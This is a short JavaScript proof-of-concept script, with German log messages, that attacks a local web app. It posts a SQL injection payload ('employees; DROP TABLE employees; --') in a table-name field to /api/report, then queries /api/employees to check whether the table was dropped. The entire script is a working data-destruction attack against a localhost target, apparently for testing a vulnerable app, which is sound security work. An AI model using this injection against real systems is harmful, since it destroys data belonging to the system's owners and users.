async function run() {
  const baseUrl = 'http://localhost:3000';
  const maliciousTable = `employees; DROP TABLE employees; --`;

  const response = await fetch(`${baseUrl}/api/report`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ tableName: maliciousTable })
  });

  const body = await response.json();
  console.log('--- DoS Angriff ---');
  console.log(JSON.stringify(body, null, 2));

  const verify = await fetch(`${baseUrl}/api/employees?department=${encodeURIComponent('Finance')}`);
  const text = await verify.text();
  console.log('\n--- Nach dem Angriff (Versuch auf employees zuzugreifen) ---');
  console.log(text);
}

run().catch((error) => {
  console.error('Angriff fehlgeschlagen:', error);
});
